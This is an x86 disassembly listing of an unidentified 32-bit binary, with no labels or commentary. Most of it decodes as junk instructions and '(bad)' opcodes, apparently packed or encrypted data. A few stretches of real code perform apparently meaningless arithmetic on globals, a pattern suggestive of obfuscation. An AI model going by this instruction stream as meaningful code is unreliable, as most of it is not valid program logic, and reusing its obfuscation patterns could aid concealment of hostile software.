  41e72e:	xchg   edi,eax
  41e72f:	sbb    BYTE PTR [edx+0x26292501],bh
  41e735:	retf   0x6837
  41e738:	(bad)  
  41e739:	out    0x97,al
  41e73b:	pusha  
  41e73c:	aad    0xf6
  41e73e:	ficomp WORD PTR [eax+0x49]
  41e741:	into   
  41e742:	cmp    al,0x3f
  41e744:	xchg   DWORD PTR [eax],eax
  41e746:	sub    BYTE PTR [eax-0x48c216b0],ch
  41e74c:	leave  
  41e74d:	inc    ecx
  41e74e:	xchg   edx,eax
  41e74f:	adc    al,al
  41e751:	jo     0x41e6ef
  41e753:	cs fsubr st,st(2)
  41e756:	inc    eax
  41e757:	pop    edi
  41e758:	push   eax
  41e759:	mov    esi,0xff672d54
  41e75e:	rol    cl,1
  41e760:	add    BYTE PTR [eax-0x1a92f0fa],0x1
  41e767:	int    0xf
  41e769:	add    DWORD PTR [ecx+ebx*8],0xb1384229
  41e770:	test   al,0x5e
  41e772:	xchg   edi,eax
  41e773:	or     ah,ch
  41e775:	xor    al,BYTE PTR [edi-0x260dd634]
  41e77b:	dec    ebp
  41e77c:	int    0x2c
  41e77e:	iret   
  41e77f:	pop    ds
  41e780:	xchg   ebx,eax
  41e781:	add    ecx,DWORD PTR [eax-0x6cdc6d4a]
  41e787:	inc    ebp
  41e788:	pop    esi
  41e789:	sbb    ebp,DWORD PTR [ecx+ebp*4+0x2efd38b4]
  41e790:	mov    ds:0xb6c92ecc,eax
  41e795:	dec    ebx
  41e796:	mov    al,ds:0xc23a94b3
  41e79b:	ret    
  41e79c:	xchg   edi,eax
  41e79d:	pop    esi
  41e79e:	imul   ebx,DWORD PTR [esp-0x3],0xffffff93
  41e7a3:	jno    0x41e81b
  41e7a5:	outs   dx,DWORD PTR ds:[esi]
  41e7a6:	adc    DWORD PTR [edx+0x7f],0xffffffcf
  41e7aa:	mov    ch,0x6b
  41e7ac:	out    dx,al
  41e7ad:	lds    ebp,FWORD PTR [edx+0x5a228844]
  41e7b3:	and    ah,BYTE PTR [ecx+ecx*4]
  41e7b6:	add    dl,BYTE PTR [ebx-0x4d6888f4]
  41e7bc:	mov    eax,es:0x8fd32306
  41e7c2:	inc    esi
  41e7c3:	sbb    DWORD PTR [esi+0x3615541c],eax
  41e7c9:	retf   0xc1b8
  41e7cc:	lea    esi,[esi]
  41e7ce:	push   0x136408cb
  41e7d3:	(bad)  
  41e7d4:	adc    cl,bl
  41e7d6:	jae    0x41e77e
  41e7d8:	adc    eax,0x69944ca
  41e7dd:	int    0x2f
  41e7df:	mov    bl,dh
  41e7e1:	(bad)
  41e7e4:	mov    es,WORD PTR [ebx]
  41e7e6:	mov    eax,ds:0xa1276280
  41e7eb:	aaa    
  41e7ec:	imul   ecx,DWORD PTR [esi+0x3ab8db0a],0x73481516
  41e7f6:	(bad)  
  41e7f7:	scas   al,BYTE PTR es:[edi]
  41e7f8:	xor    bh,cl
  41e7fa:	inc    edi
  41e7fb:	test   al,0xcf
  41e7fd:	ins    DWORD PTR es:[edi],dx
  41e7fe:	add    BYTE PTR [ecx],0xd5
  41e801:	cmp    cl,al
  41e803:	and    dl,bh
  41e805:	shl    DWORD PTR [eax-0x6d3b56bf],1
  41e80b:	xchg   esi,eax
  41e80c:	jle    0x41e7a9
  41e80e:	dec    eax
  41e80f:	or     DWORD PTR [edx-0x7d],ecx
  41e812:	mov    ebp,0x9a004404
  41e817:	jae    0x41e7a7
  41e819:	add    BYTE PTR [edi],0x3e
  41e81c:	mov    cl,0xc7
  41e81e:	xchg   ebx,eax
  41e81f:	cmp    cl,al
  41e821:	out    dx,eax
  41e822:	mov    bl,0x36
  41e824:	jmp    0x41e7bc
  41e826:	scas   eax,DWORD PTR es:[edi]
  41e827:	jno    0x41e892
  41e829:	sub    DWORD PTR [eax],ebx
  41e82b:	pop    ebx
  41e82c:	sub    ecx,ecx
  41e82e:	mov    eax,ds:0xe9fbeace
  41e833:	cmc    
  41e834:	push   ds
  41e835:	aad    0xb9
  41e837:	out    dx,al
  41e838:	cmp    edx,DWORD PTR [edi]
  41e83a:	not    DWORD PTR [ebx]
  41e83c:	jae    0x41e7d1
  41e83e:	sub    dl,BYTE PTR [esp+edx*4]
  41e841:	pop    edx
  41e842:	dec    ebp
  41e843:	and    DWORD PTR [ebx+0x9],ebx
  41e846:	push   esp
  41e847:	loope  0x41e857
  41e849:	jmp    0x71c89ec6
  41e84e:	frstor [ebx-0x11]
  41e851:	add    BYTE PTR [eax+0xf3e0e6b],al
  41e857:	mov    ch,0xbc
  41e859:	std    
  41e85a:	mov    ch,0x42
  41e85c:	inc    edi
  41e85d:	in     eax,0xb3
  41e85f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e860:	mov    ecx,DWORD PTR [ebp+0xcf102e2]
  41e866:	sahf   
  41e867:	add    DWORD PTR [ebx],ebx
  41e869:	dec    esi
  41e86a:	retf   
  41e86b:	jp     0x41e89e
  41e86d:	inc    esp
  41e86e:	push   ebp
  41e86f:	push   0x441d5df6
  41e874:	add    BYTE PTR [ebx+esi*4],al
  41e877:	or     edi,DWORD PTR [ecx+0x6e]
  41e87a:	idiv   DWORD PTR [ecx]
  41e87c:	sub    eax,0x3ca27acc
  41e881:	out    dx,al
  41e882:	iret   
  41e883:	jl     0x81382eb3
  41e889:	inc    esp
  41e88a:	cli    
  41e88b:	cwde   
  41e88c:	ret    
  41e88d:	loop   0x41e8cf
  41e88f:	enter  0x568f,0x3a
  41e893:	and    DWORD PTR [edx-0x5d],edi
  41e896:	and    cl,BYTE PTR [ecx+0x64]
  41e899:	push   0x1368994f
  41e89e:	out    0xf4,al
  41e8a0:	inc    ebx
  41e8a1:	(bad)  
  41e8a2:	repnz xchg edi,eax
  41e8a4:	data16 cmp dl,0x6e
  41e8a8:	mov    esp,ebx
  41e8aa:	push   edx
  41e8ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8ac:	es aas 
  41e8ae:	lock inc esi
  41e8b0:	jae    0x41e852
  41e8b2:	xchg   esi,eax
  41e8b3:	fnstsw WORD PTR [ebx+eax*4+0x71]
  41e8b7:	dec    eax
  41e8b8:	int3   
  41e8b9:	repnz popf 
  41e8bb:	mov    cl,0xc9
  41e8bd:	(bad)  
  41e8be:	fwait
  41e8bf:	imul   ecx,DWORD PTR [edi+ebp*4],0xffffffc4
  41e8c3:	adc    al,0xd2
  41e8c5:	pop    ss
  41e8c6:	test   dl,bl
  41e8c8:	stc    
  41e8c9:	iret   
  41e8ca:	test   eax,0xf6437531
  41e8cf:	jp     0x41e8f2
  41e8d1:	xchg   DWORD PTR [esi],ebx
  41e8d3:	aas    
  41e8d4:	call   0x79cb:0x5d8471a7
  41e8db:	cmc    
  41e8dc:	cwde   
  41e8dd:	dec    esi
  41e8de:	pop    ss
  41e8df:	sub    DWORD PTR [ecx+0x17],ebp
  41e8e2:	aas    
  41e8e3:	in     eax,dx
  41e8e4:	fst    QWORD PTR [ebp-0x50]
  41e8e7:	in     eax,dx
  41e8e8:	in     al,0x51
  41e8ea:	push   ebx
  41e8eb:	(bad)  
  41e8ec:	retf   0x56f0
  41e8ef:	jae    0x41e8be
  41e8f1:	test   DWORD PTR [eax-0x3c],ebx
  41e8f4:	loop   0x41e949
  41e8f6:	clc    
  41e8f7:	daa    
  41e8f8:	mov    edx,0x6060eea9
  41e8fd:	or     DWORD PTR [ecx-0x60],edx
  41e900:	mov    BYTE PTR [ebp-0x4b],dl
  41e903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e904:	sub    ah,BYTE PTR [edi+eiz*4-0x2d]
  41e908:	mov    bl,0x60
  41e90a:	cmp    BYTE PTR [edi+0x436d907],cl
  41e910:	jnp    0x41e8ef
  41e912:	lock int 0xde
  41e915:	out    0xc5,al
  41e917:	xlat   BYTE PTR ds:[ebx]
  41e918:	fwait
  41e919:	mov    al,ds:0x4477375
  41e91e:	test   ebx,ebp
  41e920:	outs   dx,BYTE PTR ds:[esi]
  41e921:	xor    DWORD PTR [ecx],0x3e05bd31
  41e927:	sar    DWORD PTR ss:[eax+0x47],1
  41e92b:	dec    ebx
  41e92c:	mov    eax,0x539565ca
  41e931:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e932:	xchg   edx,eax
  41e933:	neg    BYTE PTR [edx+0x5e]
  41e936:	sbb    eax,ebp
  41e938:	cli    
  41e939:	jmp    0x41e8e3
  41e93b:	(bad)
  41e93f:	(bad)  [ecx-0x284cf166]
  41e945:	push   cs
  41e946:	and    eax,0x47c07c9c
  41e94b:	repz add eax,0xa55d207a
  41e951:	das    
  41e952:	shl    BYTE PTR ds:0x5be8bd09,cl
  41e958:	stos   DWORD PTR es:[edi],eax
  41e959:	xor    eax,0xdfec2709
  41e95e:	push   ebp
  41e95f:	push   ss
  41e960:	dec    ecx
  41e961:	sti    
  41e962:	rol    BYTE PTR [edx+edi*8],0xb9
  41e966:	in     eax,0x34
  41e968:	jmp    0xd63f:0x405e36c3
  41e96f:	and    eax,0xfc7e8cfe
  41e974:	sar    DWORD PTR [edx+edi*1],cl
  41e977:	sub    ebp,eax
  41e979:	xchg   edi,eax
  41e97a:	mov    ds:0x2d320577,eax
  41e97f:	outs   dx,DWORD PTR ds:[esi]
  41e980:	sahf   
  41e981:	sbb    eax,0x8bd70b3b
  41e986:	retf   0x548b
  41e989:	and    al,0x18
  41e98b:	xor    eax,ebx
  41e98d:	xor    ecx,esi
  41e98f:	mov    esi,DWORD PTR [esp+0x1c]
  41e993:	cmp    edx,eax
  41e995:	jne    0x41e9a3
  41e99b:	cmp    esi,ecx
  41e99d:	je     0x41e9ea
  41e9a3:	push   DWORD PTR ds:0x422658
  41e9a9:	push   DWORD PTR ds:0x4223ec
  41e9af:	mov    eax,ds:0x422568
  41e9b4:	mov    eax,DWORD PTR [eax+0x1a4]
  41e9ba:	push   DWORD PTR [eax]
  41e9bc:	mov    eax,DWORD PTR [esp+0x78]
  41e9c0:	call   eax
  41e9c2:	mov    ecx,DWORD PTR ds:0x422568
  41e9c8:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41e9ce:	mov    DWORD PTR [ecx],eax
  41e9d0:	mov    eax,ds:0x422568
  41e9d5:	push   0x4
  41e9d7:	add    eax,0x1dc
  41e9dc:	push   eax
  41e9dd:	lea    eax,[esp+0x84]
  41e9e4:	push   eax
  41e9e5:	call   0x415231
  41e9ea:	mov    eax,DWORD PTR [esp+0x7c]
  41e9ee:	mov    eax,DWORD PTR [eax]
  41e9f0:	pop    edi
  41e9f1:	pop    esi
  41e9f2:	pop    ebx
  41e9f3:	mov    esp,ebp
  41e9f5:	pop    ebp
  41e9f6:	ret    0xc
  41e9f9:	push   ebp
  41e9fa:	mov    ebp,esp
  41e9fc:	sub    esp,0x23c
  41ea02:	or     ecx,eax
  41ea04:	push   ebx
  41ea05:	cmp    DWORD PTR ds:0x428277,0x0
  41ea0c:	mov    DWORD PTR ds:0x428383,0x7749
  41ea16:	mov    DWORD PTR ds:0x428183,ebx
  41ea1c:	mov    DWORD PTR ds:0x428323,edx
  41ea22:	mov    DWORD PTR ds:0x428323,0xc7b
  41ea2c:	jmp    0x41ea8e
  41ea31:	mov    DWORD PTR ds:0x42829b,edx
  41ea37:	cmp    DWORD PTR ds:0x428277,0x0
  41ea3e:	jg     0x41ea74
  41ea44:	push   0x2154
  41ea49:	push   0x5063
  41ea4e:	call   DWORD PTR ds:0x428e24
  41ea54:	sbb    DWORD PTR ds:0x42837f,ecx
  41ea5a:	mov    ecx,DWORD PTR ds:0x42832b
  41ea60:	xor    ecx,DWORD PTR ds:0x428317
  41ea66:	mov    DWORD PTR ds:0x42832b,ecx
  41ea6c:	sbb    ecx,0x6e15
  41ea72:	neg    ecx
  41ea74:	xor    DWORD PTR ds:0x428253,ecx
  41ea7a:	adc    ecx,DWORD PTR ds:0x4281a7
  41ea80:	mov    ecx,DWORD PTR ds:0x4281f3
  41ea86:	mov    ecx,DWORD PTR [ecx]
  41ea88:	and    DWORD PTR ds:0x428197,ecx
  41ea8e:	push   esi
  41ea8f:	mov    ecx,DWORD PTR ds:0x428207
  41ea95:	mov    eax,ds:0x4282f3
  41ea9a:	sub    eax,ecx
  41ea9c:	imul   ecx,DWORD PTR [ecx+eax*1]
  41eaa0:	push   edi
  41eaa1:	add    DWORD PTR ds:0x42826b,ebx
  41eaa7:	mov    DWORD PTR [ebp-0x50],0x1
  41eaae:	sub    DWORD PTR ds:0x42829b,edi
  41eab4:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41eabe:	xor    DWORD PTR ds:0x42832b,0x437e
  41eac8:	mov    DWORD PTR [ebp-0xb8],0x1
  41ead2:	mov    ecx,DWORD PTR [ebp-0xb8]
  41ead8:	add    eax,0x2e28
  41eadd:	mov    eax,0x584
  41eae2:	xor    edx,edx
  41eae4:	sbb    DWORD PTR ds:0x4283a7,0x4282ff
  41eaee:	div    ecx
  41eaf0:	xor    ecx,0x2352
  41eaf6:	imul   eax,eax,0x51d4
  41eafc:	neg    ecx
  41eafe:	mov    ecx,DWORD PTR [ebp-0xbc]
  41eb04:	or     DWORD PTR ds:0x428393,0x4283a3
  41eb0e:	xor    eax,ecx
  41eb10:	and    eax,0x4c09
  41eb15:	xor    ecx,DWORD PTR ds:0x428313
  41eb1b:	mov    ecx,DWORD PTR [ebp-0x50]
  41eb1e:	xor    edx,edx
  41eb20:	and    DWORD PTR ds:0x42826b,0x42819f
  41eb2a:	div    ecx
  41eb2c:	or     DWORD PTR ds:0x4283b7,0x3423
  41eb36:	sub    eax,0x401
  41eb3b:	cmp    DWORD PTR ds:0x428337,0x0
  41eb42:	mov    DWORD PTR ds:0x4283a7,edx
  41eb48:	mov    DWORD PTR ds:0x428247,ebx
  41eb4e:	not    DWORD PTR ds:0x428243
  41eb54:	jmp    0x41ebb2
  41eb59:	mov    DWORD PTR ds:0x42823b,0x3ca0
  41eb63:	not    DWORD PTR ds:0x428327
  41eb69:	cmp    DWORD PTR ds:0x428337,0x0
  41eb70:	je     0x41eba0
  41eb76:	push   DWORD PTR [ebp-0x10]
  41eb79:	push   0x4da1
  41eb7e:	push   0x1144
  41eb83:	push   DWORD PTR [ebp-0x18]
  41eb86:	call   DWORD PTR ds:0x428e28
  41eb8c:	add    edx,0x1800
  41eb92:	add    edx,DWORD PTR ds:0x42839f
  41eb98:	sub    ecx,ecx
  41eb9a:	adc    ecx,0x47f1
  41eba0:	sub    edx,edx
  41eba2:	mov    DWORD PTR ds:0x4283a7,0x44a4
  41ebac:	and    ecx,DWORD PTR ds:0x42823f
  41ebb2:	mov    DWORD PTR [ebp-0x90],eax
  41ebb8:	mov    eax,ds:0x4282d3
  41ebbd:	mov    eax,DWORD PTR [eax]
  41ebbf:	sbb    DWORD PTR ds:0x4283a3,eax
  41ebc5:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41ebcf:	add    DWORD PTR ds:0x42816b,0x4282b7
  41ebd9:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41ebe0:	xor    DWORD PTR ds:0x42825f,edx
  41ebe6:	mov    DWORD PTR [ebp-0xb4],0x3842
  41ebf0:	or     edx,ecx
  41ebf2:	jmp    0x41ef4e
  41ebf7:	ret    0x8bf6
  41ebfa:	push   ebx
  41ebfb:	sbb    ch,BYTE PTR [ebx]
  41ebfd:	mov    edx,0x71125f66
  41ec02:	mov    al,0x24
  41ec04:	or     eax,0x2f0eaa29
  41ec09:	push   ss
  41ec0a:	sbb    BYTE PTR [ebx-0x6ee7e7ee],ah
  41ec10:	(bad)  
  41ec12:	daa    
  41ec13:	lahf   
  41ec14:	adc    edx,edx
  41ec16:	imul   ebx,esi,0x6b
  41ec19:	sar    DWORD PTR [edi-0x62],1
  41ec1c:	imul   ebp,DWORD PTR [ebx-0x337a587c],0x6c
  41ec23:	adc    BYTE PTR [ebx+ecx*2],ah
  41ec26:	repnz iret 
  41ec28:	sbb    ebp,DWORD PTR [ebp+0x10]
  41ec2b:	sub    BYTE PTR [ebp+0x6204e344],bh
  41ec31:	inc    edx
  41ec32:	lods   al,BYTE PTR ds:[esi]
  41ec33:	pop    ebp
  41ec34:	push   cs
  41ec35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec36:	jno    0x41ec5a
  41ec38:	cwde   
  41ec39:	adc    eax,0xf4c39e22
  41ec3e:	in     eax,dx
  41ec3f:	outs   dx,DWORD PTR ds:[esi]
  41ec40:	imul   edi,DWORD PTR [eax],0x22fac88b
  41ec46:	test   BYTE PTR [eax-0x4e],bl
  41ec49:	jp     0x41ebfc
  41ec4b:	ja     0x41ebf7
  41ec4d:	jns    0x41ec86
  41ec4f:	push   0xacbcd2a9
  41ec54:	outs   dx,DWORD PTR ds:[esi]
  41ec55:	arpl   WORD PTR [edi],dx
  41ec57:	js     0x41ec58
  41ec59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec5a:	sub    DWORD PTR [ecx],eax
  41ec5c:	inc    edi
  41ec5d:	aas    
  41ec5e:	dec    esi
  41ec5f:	mov    bl,bh
  41ec61:	xchg   esi,eax
  41ec62:	mov    dl,0xed
  41ec64:	gs daa 
  41ec66:	jg     0x41ebf8
  41ec68:	mov    ebp,0xfdef68ae
  41ec6d:	cmp    esi,DWORD PTR [ebx+0xe464885]
  41ec73:	adc    BYTE PTR [esi+0x4327cbe7],0x1a
  41ec7a:	je     0x41ec56
  41ec7c:	mul    DWORD PTR [edi+0x31]
  41ec7f:	mov    ah,0x69
  41ec81:	sub    eax,DWORD PTR [edi-0x69]
  41ec84:	inc    DWORD PTR [edx]
  41ec86:	loop   0x41ec7a
  41ec88:	push   esp
  41ec89:	xchg   BYTE PTR [eax],al
  41ec8b:	or     ch,BYTE PTR [ebp+ebp*1+0x29]
  41ec8f:	cmp    DWORD PTR [edx+0x4a7507ab],ebp
  41ec95:	add    BYTE PTR [ebx+ebx*4-0x24],ch
  41ec99:	cld    
  41ec9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec9b:	push   0xffffff85
  41ec9d:	in     eax,0xa7
  41ec9f:	jb     0x41ec83
  41eca1:	jl     0x41ec2d
  41eca3:	and    DWORD PTR [edi],0xffffffda
  41eca6:	jl     0x41ece5
  41eca8:	mov    ds:0xd423c1dc,al
  41ecad:	loop   0x41eca6
  41ecaf:	xchg   DWORD PTR [eax+0x2c],ecx
  41ecb2:	cli    
  41ecb3:	lock or eax,DWORD PTR [ebx+edi*2]
  41ecb7:	das    
  41ecb8:	stos   BYTE PTR es:[edi],al
  41ecb9:	mov    bh,0xd7
  41ecbb:	mov    ds:0x8f784232,eax
  41ecc0:	cmp    ecx,DWORD PTR [esi+eiz*8]
  41ecc3:	sbb    eax,DWORD PTR [ecx+0x65]
  41ecc6:	mov    ah,0x5a
  41ecc8:	fmul   st(7),st
  41ecca:	cmc    
  41eccb:	outs   dx,DWORD PTR ds:[esi]
  41eccc:	mov    esp,0x5bae9272
  41ecd1:	pop    edx
  41ecd2:	mov    al,0xa
  41ecd4:	pushf  
  41ecd5:	and    DWORD PTR ds:0x3b8d50ea,esi
  41ecdb:	aas    
  41ecdc:	push   eax
  41ecdd:	and    bh,cl
  41ecdf:	rcr    BYTE PTR [ecx+0x7b091374],cl
  41ece5:	daa    
  41ece6:	mov    esp,0xb7f5ef30
  41eceb:	dec    ebx
  41ecec:	jns    0x41eca7
  41ecee:	les    ebp,FWORD PTR [ecx+0x42]
  41ecf1:	dec    esp
  41ecf2:	cdq    
  41ecf3:	cmp    ah,ch
  41ecf5:	mov    edx,0x5ac43fe0
  41ecfa:	adc    esp,DWORD PTR [esi]
  41ecfc:	push   esi
  41ecfd:	jbe    0x41ecb5
  41ecff:	fimul  DWORD PTR [ebx-0x42ec97a6]
  41ed05:	dec    ecx
  41ed06:	bound  ebp,QWORD PTR [esi+0x5b]
  41ed09:	xor    BYTE PTR [ecx-0x37],bh
  41ed0c:	inc    BYTE PTR [ebx-0x235680ec]
  41ed12:	lods   eax,DWORD PTR ds:[esi]
  41ed13:	sbb    ebx,DWORD PTR [ebx+0x541e59d6]
  41ed19:	aas    
  41ed1a:	(bad)
  41ed1d:	dec    esi
  41ed1e:	cmp    ecx,edx
  41ed20:	push   ebp
  41ed21:	xchg   edi,eax
  41ed22:	push   esi
  41ed23:	lds    ecx,FWORD PTR [eax-0x71961413]
  41ed29:	xlat   BYTE PTR ds:[ebx]
  41ed2a:	pop    esi
  41ed2b:	hlt    
  41ed2c:	js     0x41ecb2
  41ed2e:	mov    dl,0xb7
  41ed30:	loope  0x41ed59
  41ed32:	(bad)  
  41ed33:	test   DWORD PTR [esi+0x66],0xa3d5f18d
  41ed3a:	rol    BYTE PTR [eax+ebx*4-0x24],0xb1
  41ed3f:	dec    edx
  41ed40:	out    dx,al
  41ed41:	adc    al,0xb5
  41ed43:	xchg   edi,eax
  41ed44:	in     eax,0xe7
  41ed46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed47:	push   edx
  41ed48:	in     eax,dx
  41ed49:	fistp  WORD PTR [ebx]
  41ed4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed4c:	sbb    eax,0x8c6b1521
  41ed51:	sub    BYTE PTR [ebp+0x22cc4bf1],bh
  41ed57:	rcl    al,0x5a
  41ed5a:	pop    ebp
  41ed5b:	mov    ebp,0xef4eb9ef
  41ed60:	frstor [ecx+0x3c973db8]
  41ed66:	and    bh,BYTE PTR [edx+0x6e]
  41ed69:	out    dx,eax
  41ed6a:	outs   dx,BYTE PTR ds:[esi]
  41ed6b:	fwait
  41ed6c:	imul   esp,edx,0xb4a2a623
  41ed72:	(bad)  [eax]
  41ed74:	icebp  
  41ed75:	fmul   st,st(3)
  41ed77:	fs jbe 0x41edbb
  41ed7a:	data16 ins BYTE PTR es:[edi],dx
  41ed7c:	cmc    
  41ed7d:	sub    BYTE PTR [ebx+0x35],0x80
  41ed81:	inc    eax
  41ed82:	cmp    esp,eax
  41ed84:	pusha  
  41ed85:	loop   0x41ee02
  41ed87:	into   
  41ed88:	and    BYTE PTR fs:[ebx+0x5bdcf29],al
  41ed8f:	mov    ebx,0x2b58dbcd
  41ed94:	bound  ebx,QWORD PTR [esi+0x53]
  41ed97:	adc    dl,0xf8
  41ed9a:	pop    ebx
  41ed9b:	push   ds
  41ed9c:	in     al,0xbf
  41ed9e:	ins    DWORD PTR es:[edi],dx
  41ed9f:	xor    ch,0xad
  41eda2:	xor    BYTE PTR [ecx-0x8],ch
  41eda5:	retf   
  41eda6:	sar    ebp,1
  41eda8:	and    eax,DWORD PTR [edx+0x4c]
  41edab:	push   eax
  41edac:	xor    dh,ch
  41edae:	sub    BYTE PTR [edi+0x71e3b9c2],dh
  41edb4:	mov    esi,0xfe06e6a6
  41edb9:	mov    edx,0x96bee41
  41edbe:	add    esi,DWORD PTR [ecx-0x1268d3ee]
  41edc4:	push   eax
  41edc5:	(bad)  
  41edc6:	cwde   
  41edc7:	add    al,0xba
  41edc9:	scas   eax,DWORD PTR es:[edi]
  41edca:	sub    bh,0xa8
  41edcd:	push   DWORD PTR ds:0xe6c870bf
  41edd3:	stos   DWORD PTR es:[edi],eax
  41edd4:	dec    edi
  41edd5:	in     al,0x26
  41edd7:	scas   eax,DWORD PTR es:[edi]
  41edd8:	jmp    0x41edb5
  41edda:	push   es
  41eddb:	dec    eax
  41eddc:	or     BYTE PTR [ebp+0x61957217],dh
  41ede2:	mov    ds:0xa942a1f4,al
  41ede7:	je     0x41edc4
  41ede9:	cmp    al,0x75
  41edeb:	or     bh,BYTE PTR fs:[ebp+ebx*8-0x7f10e6df]
  41edf3:	out    0x16,eax
  41edf5:	dec    esp
  41edf6:	sub    ah,BYTE PTR [ecx]
  41edf8:	push   es
  41edf9:	mov    dl,0x4c
  41edfb:	ds mov bh,0x52
  41edfe:	sub    al,0x69
  41ee00:	adc    BYTE PTR [ebx],bl
  41ee02:	cmp    DWORD PTR [eax+0x40],eax
  41ee05:	inc    esp
  41ee06:	mov    edx,0x51451029
  41ee0b:	dec    eax
  41ee0c:	add    al,0x1c
  41ee0e:	push   ebx
  41ee0f:	mul    cl
  41ee11:	imul   ebx,DWORD PTR [esi+ecx*8+0x3d9251ea],0xffffffad
  41ee19:	dec    esi
  41ee1a:	cmc    
  41ee1b:	dec    ebx
  41ee1c:	out    dx,al
  41ee1d:	shl    ebx,0xcf
  41ee20:	mov    ebp,ebx
  41ee22:	test   ecx,0x7197ff6e
  41ee28:	(bad)  
  41ee29:	jmp    0xc72d760
  41ee2e:	lock bound edi,QWORD PTR [esi]
  41ee31:	jl     0x41ee14
  41ee33:	or     esi,ebx
  41ee35:	stos   DWORD PTR es:[edi],eax
  41ee36:	mov    BYTE PTR [edi-0x49],dl
  41ee39:	mov    ecx,0xe06e23ed
  41ee3e:	inc    ecx
  41ee3f:	and    eax,0xa48976ec
  41ee44:	retf   0x9d9c
  41ee47:	mov    BYTE PTR [esi-0x400673ff],cl
  41ee4d:	add    eax,0xb877c813
  41ee52:	popf   
  41ee53:	mov    ch,0xdf
  41ee55:	pop    ss
  41ee56:	xor    dl,BYTE PTR [ebx+ebp*8]
  41ee59:	ins    DWORD PTR es:[edi],dx
  41ee5a:	mov    ah,0x64
  41ee5c:	or     bl,0xb7
  41ee5f:	jae    0x41eea8
  41ee61:	push   0xe
  41ee63:	mov    ebx,0x40bab5c3
  41ee68:	and    ecx,DWORD PTR [eax]
  41ee6a:	cmp    BYTE PTR [edi+0xb],0x83
  41ee6e:	push   cs
  41ee6f:	jl     0x41eeee
  41ee71:	xchg   esp,eax
  41ee72:	sbb    DWORD PTR [ebx+0xd329c19],ebx
  41ee78:	lahf   
  41ee79:	pop    esi
  41ee7a:	jge    0x41ee75
  41ee7c:	and    al,0x5d
  41ee7e:	dec    ebp
  41ee7f:	lds    ecx,FWORD PTR [edx-0xcce3be5]
  41ee85:	jge    0x41ef06
  41ee87:	adc    DWORD PTR [eax+0x27c65e14],ebp
  41ee8d:	push   edx
  41ee8e:	cld    
  41ee8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee90:	mov    ebx,0x4ec0bde3
  41ee95:	jb     0x41ee9f
  41ee97:	mov    BYTE PTR [edx+ecx*2+0x73],ah
  41ee9b:	arpl   WORD PTR [esi+0x5a75482c],si
  41eea1:	pop    eax
  41eea2:	xchg   BYTE PTR [edx-0x254eaf2c],dh
  41eea8:	jnp    0x41eed9
  41eeaa:	mov    ds:0x15386162,eax
  41eeaf:	fxch   st(2)
  41eeb1:	push   es
  41eeb2:	test   al,0xbc
  41eeb4:	sbb    al,0x92
  41eeb6:	add    al,0x80
  41eeb8:	sbb    al,0xd1
  41eeba:	ss jp  0x41ef17
  41eebd:	jmp    0xf5bf76cb
  41eec2:	inc    edi
  41eec3:	and    al,0x88
  41eec5:	dec    esi
  41eec6:	jp     0x41eed7
  41eec8:	hlt    
  41eec9:	loop   0x41eeb4
  41eecb:	cwde   
  41eecc:	push   es
  41eecd:	dec    esi
  41eece:	sbb    dl,dh
  41eed0:	or     eax,DWORD PTR [esi-0x527e2ac4]
  41eed6:	sub    DWORD PTR [ecx],0xffffff8b
  41eed9:	sqrtps xmm6,XMMWORD PTR [esi+0x1f7bae3]
  41eee0:	pop    ebp
  41eee1:	add    bh,ch
  41eee3:	jl     0x41ee7d
  41eee5:	loop   0x41ef31
  41eee7:	inc    ecx
  41eee8:	pop    es
  41eee9:	sahf   
  41eeea:	ja     0x41eeec
  41eeec:	call   FWORD PTR [ebp-0x78a0e8c1]
  41eef2:	ret    0xb4c6
  41eef5:	inc    ebp
  41eef6:	mov    ebp,0x28c3f0ed
  41eefb:	or     ebp,DWORD PTR [eax-0x38]
  41eefe:	enter  0x70b3,0x45
  41ef02:	out    dx,al
  41ef03:	mov    esp,0x9d321d6
  41ef08:	lds    eax,FWORD PTR [ebx-0x494d18be]
  41ef0e:	jne    0x41eeb0
  41ef10:	ficom  WORD PTR [edi+0x18]
  41ef13:	mov    ds:0xe3215542,eax
  41ef18:	adc    bh,0x87
  41ef1b:	int3   
  41ef1c:	jne    0x41eee5
  41ef1e:	jge    0x41eee8
  41ef20:	out    0xa7,al
  41ef22:	aas    
  41ef23:	push   eax
  41ef24:	je     0x41ef32
  41ef26:	cmp    al,0xd1
  41ef28:	retf   0x8b5e
  41ef2b:	or     edx,DWORD PTR [edx+0x47]
  41ef2e:	stc    
  41ef2f:	add    DWORD PTR [eax+ecx*1+0x74],0xffffffb2
  41ef34:	pop    esp
  41ef35:	xor    al,0x32
  41ef37:	lds    ecx,FWORD PTR [esi+0x77]
  41ef3a:	enter  0x6405,0x54
  41ef3e:	xchg   edi,eax
  41ef3f:	idiv   BYTE PTR [ecx-0x4c6385da]
  41ef45:	dec    ebp
  41ef46:	cs ins BYTE PTR es:[edi],dx
  41ef48:	jo     0x41efaf
  41ef4a:	test   BYTE PTR [edi-0x9],dh
  41ef4d:	inc    ebx
  41ef4e:	mov    eax,DWORD PTR [ebp-0x4c]
  41ef51:	adc    DWORD PTR ds:0x42817f,0x3493
  41ef5b:	add    eax,DWORD PTR [ebp-0xb4]
  41ef61:	xor    edx,0x29c
  41ef67:	xor    eax,0x2e02
  41ef6c:	sbb    ecx,ecx
  41ef6e:	xor    eax,0x7294
  41ef73:	movzx  edx,WORD PTR ds:0x4282a3
  41ef7a:	sbb    DWORD PTR ds:0x42817f,edx
  41ef80:	imul   eax,eax,0x68f3
  41ef86:	and    DWORD PTR ds:0x428197,edi
  41ef8c:	mov    ecx,DWORD PTR [ebp-0x8c]
  41ef92:	cmp    DWORD PTR ds:0x42830b,0x0
  41ef99:	mov    edx,0x254
  41ef9e:	mov    edx,0x254c
